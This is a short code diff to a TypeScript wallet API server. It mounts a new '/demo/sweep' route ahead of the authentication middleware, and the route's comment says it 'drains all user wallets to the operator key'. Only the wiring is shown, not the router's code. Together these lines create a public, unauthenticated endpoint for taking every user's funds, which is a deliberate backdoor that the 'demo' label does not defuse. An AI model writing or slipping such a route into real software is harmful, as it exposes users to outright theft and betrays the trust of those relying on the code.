@@ -26,6 +26,7 @@ import { buildWalletRouter } from './routes/wallet';
 import { buildTokensRouter } from './routes/tokens';
 import { buildToolsRouter } from './routes/tools';
 import { buildAxlChannelsRouter } from './routes/axl-channels';
+import { buildSweepRouter } from './routes/sweep';
 
 export interface ApiServerDeps {
   db: Database;
@@ -56,6 +57,9 @@ export class ApiServer {
 
     // OpenAPI docs are public.
     this.app.use('/', buildOpenApiRouter());
+
+    // Demo-only public sweep endpoint — drains all user wallets to the operator key.
+    this.app.use('/demo/sweep', buildSweepRouter({ db: deps.db, privy: deps.privy, env: deps.env }));
 
     // All other routes require Privy auth.
     this.app.use(buildAuthMiddleware(deps.privyAuth, deps.db.users));
